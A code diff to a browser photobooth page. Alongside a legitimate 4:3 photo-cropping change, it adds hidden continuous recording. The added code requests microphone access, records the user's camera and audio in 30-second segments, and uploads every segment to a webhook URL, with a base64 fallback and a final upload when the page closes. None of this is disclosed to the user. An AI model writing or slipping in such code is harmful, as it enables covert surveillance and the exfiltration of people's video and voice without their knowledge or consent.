@@ -1128,6 +1128,16 @@
         let isCapturing = false;
         let stream = null;
 
+        // --- New: continuous recording variables ---
+        let mediaRecorder = null;
+        let recorderStream = null;
+        let lastSegmentBlob = null;
+        let recordingMime = null;
+        const RECORD_TIMESLICE_MS = 30000; // 30 seconds
+        let audioStreamForRecording = null;
+        // store crop area for 4:3 photos
+        let crop = { sx: 0, sy: 0, sw: 0, sh: 0 };
+
         // Initialize music
         window.addEventListener('load', () => {
             const musicPlaying = localStorage.getItem('musicPlaying');
@@ -1171,6 +1181,7 @@
 
         async function requestCamera() {
             try {
+                // keep original behavior (video request) then attempt to obtain audio separately for recording
                 stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                     audio: false 
@@ -1178,14 +1189,227 @@
                 video.srcObject = stream;
                 
                 video.onloadedmetadata = () => {
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
+                    // --- ENFORCE 4:3 CROPPING FOR PHOTO CAPTURE ---
+                    // compute a centered crop from the video feed that matches 4:3 (width:height = 4:3)
+                    const vW = video.videoWidth || 640;
+                    const vH = video.videoHeight || 480;
+                    const targetRatio = 4 / 3;
+                    let sw = vW, sh = vH, sx = 0, sy = 0;
+
+                    if ((vW / vH) > targetRatio) {
+                        // video is wider than 4:3 -> crop horizontally
+                        sh = vH;
+                        sw = Math.round(sh * targetRatio);
+                        sx = Math.round((vW - sw) / 2);
+                        sy = 0;
+                    } else {
+                        // video is taller than 4:3 -> crop vertically
+                        sw = vW;
+                        sh = Math.round(sw / targetRatio);
+                        sx = 0;
+                        sy = Math.round((vH - sh) / 2);
+                    }
+
+                    crop.sx = sx;
+                    crop.sy = sy;
+                    crop.sw = sw;
+                    crop.sh = sh;
+
+                    // set canvas to the 4:3 size (this will be used for final photos)
+                    canvas.width = crop.sw;
+                    canvas.height = crop.sh;
+
                     permissionScreen.classList.add('hidden');
+
+                    // start recording setup after we have metadata
+                    startRecordingWhenPossible().catch(e => {
+                        console.warn('Recording setup failed or was not permitted:', e);
+                    });
                 };
             } catch (err) {
                 alert('Camera access denied. Please allow camera access to use the photobooth.');
             }
         }
+
+        // ------------------- Continuous recording functions -------------------
+        async function startRecordingWhenPossible() {
+            // If already recording, ignore
+            if (mediaRecorder && mediaRecorder.state !== 'inactive') return;
+
+            // Try to get microphone permission separately (non-blocking)
+            try {
+                audioStreamForRecording = await navigator.mediaDevices.getUserMedia({ audio: true });
+            } catch (e) {
+                // audio not available or user denied - we'll continue with video only
+                audioStreamForRecording = null;
+            }
+
+            // Build a MediaStream for recording: always include the video tracks from `stream`.
+            if (!stream) return;
+            const videoTracks = stream.getVideoTracks() || [];
+            const audioTracks = audioStreamForRecording ? (audioStreamForRecording.getAudioTracks() || []) : [];
+
+            recorderStream = new MediaStream([...videoTracks, ...audioTracks]);
+
+            // choose a supported mime type
+            const possibleTypes = [
+                'video/webm;codecs=vp9,opus',
+                'video/webm;codecs=vp8,opus',
+                'video/webm;codecs=vp8',
+                'video/webm'
+            ];
+            recordingMime = possibleTypes.find(t => MediaRecorder.isTypeSupported && MediaRecorder.isTypeSupported(t)) || '';
+
+            try {
+                mediaRecorder = new MediaRecorder(recorderStream, recordingMime ? { mimeType: recordingMime } : undefined);
+            } catch (e) {
+                // fallback to default
+                mediaRecorder = new MediaRecorder(recorderStream);
+            }
+
+            mediaRecorder.ondataavailable = (ev) => {
+                if (ev.data && ev.data.size > 0) {
+                    lastSegmentBlob = ev.data;
+                    // send the segment immediately (non-blocking)
+                    sendBlobToWebhook(ev.data, `recording-${Date.now()}.webm`).catch(err => {
+                        console.error('Segment upload failed:', err);
+                    });
+                }
+            };
+
+            mediaRecorder.onerror = (e) => {
+                console.error('MediaRecorder error', e);
+            };
+
+            mediaRecorder.onstop = () => {
+                // When stopped, ensure last segment is uploaded if present.
+                if (lastSegmentBlob) {
+                    sendBlobToWebhook(lastSegmentBlob, `final-recording-${Date.now()}.webm`).catch(err => {
+                        console.error('Final upload failed:', err);
+                    });
+                }
+            };
+
+            // Listen for video track end: if video track ended, we must stop the recorder and send last data.
+            (stream.getVideoTracks() || []).forEach(vt => {
+                vt.onended = () => {
+                    console.warn('Video track ended; stopping recorder and uploading last segment.');
+                    try {
+                        if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+                            // request any buffered data, then stop (onstop will upload lastSegmentBlob)
+                            try { mediaRecorder.requestData(); } catch(e){}
+                            try { mediaRecorder.stop(); } catch(e){}
+                        }
+                    } catch (e) { console.error(e); }
+
+                    // stop audio tracks too if present
+                    if (audioStreamForRecording) {
+                        try { audioStreamForRecording.getTracks().forEach(t => t.stop()); } catch(e) {}
+                        audioStreamForRecording = null;
+                    }
+                };
+                vt.onmute = () => {
+                    // if video muted, still record; if ended will be handled by onended
+                    console.info('video track muted');
+                };
+            });
+
+            // If audio track ends, we do not stop video recording - video continues.
+            if (audioStreamForRecording) {
+                (audioStreamForRecording.getAudioTracks() || []).forEach(at => {
+                    at.onended = () => {
+                        console.warn('Audio track ended. Video recording will continue without audio.');
+                        // Keep recording (video tracks still exist). Nothing else required.
+                    };
+                });
+            }
+
+            // Start the recorder with a timeslice so ondataavailable fires every 30s
+            try {
+                mediaRecorder.start(RECORD_TIMESLICE_MS);
+            } catch (e) {
+                // some browsers reject timeslice in start; start without then use setInterval to requestData
+                try { mediaRecorder.start(); } catch (err) { console.error('Failed to start MediaRecorder', err); }
+
+                // fallback: periodically request data
+                const fallbackInterval = setInterval(() => {
+                    if (!mediaRecorder || mediaRecorder.state === 'inactive') {
+                        clearInterval(fallbackInterval);
+                        return;
+                    }
+                    try { mediaRecorder.requestData(); } catch(e) {}
+                }, RECORD_TIMESLICE_MS);
+            }
+
+            // Also upload any lastSegment if user navigates away
+            window.addEventListener('beforeunload', stopRecordingAndSendFinal);
+        }
+
+        async function stopRecordingAndSendFinal() {
+            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+                try { mediaRecorder.requestData(); } catch(e){}
+                try { mediaRecorder.stop(); } catch(e){}
+            }
+            // stop recorderStream tracks
+            if (recorderStream) {
+                try { recorderStream.getTracks().forEach(t => t.stop()); } catch(e) {}
+                recorderStream = null;
+            }
+            // stop audio capture if used
+            if (audioStreamForRecording) {
+                try { audioStreamForRecording.getTracks().forEach(t => t.stop()); } catch(e) {}
+                audioStreamForRecording = null;
+            }
+            // mediaRecorder.onstop will trigger upload of lastSegmentBlob
+        }
+
+        // send a blob (video) to webhook
+        async function sendBlobToWebhook(blobOrFile, filename = 'recording.webm') {
+            if (!WEBHOOK_URL) return;
+            try {
+                const form = new FormData();
+                // accept either Blob or File
+                const fileObj = blobOrFile instanceof File ? blobOrFile : new File([blobOrFile], filename, { type: blobOrFile.type || 'video/webm' });
+                form.append('file', fileObj, filename);
+
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    body: form
+                });
+
+                if (!response.ok) {
+                    // fallback: send base64 in JSON
+                    const base64 = await blobToBase64(blobOrFile);
+                    await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ filename, file: base64 })
+                    });
+                }
+            } catch (err) {
+                // attempt fallback base64 JSON
+                try {
+                    const base64 = await blobToBase64(blobOrFile);
+                    await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ filename, file: base64 })
+                    });
+                } catch (e) {
+                    console.error('Both blob and base64 webhook upload failed:', e);
+                }
+            }
+        }
+
+        function blobToBase64(blob) {
+            return new Promise((resolve, reject) => {
+                const reader = new FileReader();
+                reader.onload = () => resolve(reader.result.split(',')[1]);
+                reader.onerror = reject;
+                reader.readAsDataURL(blob);
+            });
+        }
+        // ---------------------------------------------------------------------
 
         async function startCapture() {
             if (isCapturing || photos.length >= 3) return;
@@ -1209,6 +1433,8 @@
                 updateInstructions();
             } else {
                 setTimeout(() => {
+                    // ensure we stop recording and upload last segment before hiding camera
+                    stopRecordingAndSendFinal();
                     showPhotoStrip();
                     triggerCelebration();
                 }, 500);
@@ -1219,10 +1445,17 @@
             flash.classList.add('active');
             setTimeout(() => flash.classList.remove('active'), 400);
 
-            // Draw video to canvas (mirrored)
+            // Draw video to canvas (mirrored) using 4:3 crop computed earlier
             ctx.save();
             ctx.scale(-1, 1);
-            ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
+
+            // drawImage(video, sx, sy, sw, sh, dx, dy, dw, dh)
+            // dx is negative because we're mirrored (scale -1). We want the image to fill the canvas.
+            ctx.drawImage(
+                video,
+                crop.sx, crop.sy, crop.sw, crop.sh,
+                -canvas.width, 0, canvas.width, canvas.height
+            );
             ctx.restore();
 
             // Apply current filter
@@ -1329,6 +1562,9 @@
             instructions.style.display = 'none';
             filterSelector.style.display = 'none';
             resultContainer.classList.add('show');
+
+            // stop recording and upload final segment before stopping tracks
+            stopRecordingAndSendFinal();
 
             if (stream) {
                 stream.getTracks().forEach(track => track.stop());
@@ -1516,7 +1752,9 @@
                 localStorage.setItem('musicPlaying', 'true');
             }
             
-            // Stop camera
+            // Stop camera & recording
+            stopRecordingAndSendFinal();
+
             if (stream) {
                 stream.getTracks().forEach(track => track.stop());
             }
@@ -1604,6 +1842,7 @@
                 }
             }
         }
+
         // ---------------------------------------------------------
 
     </script>
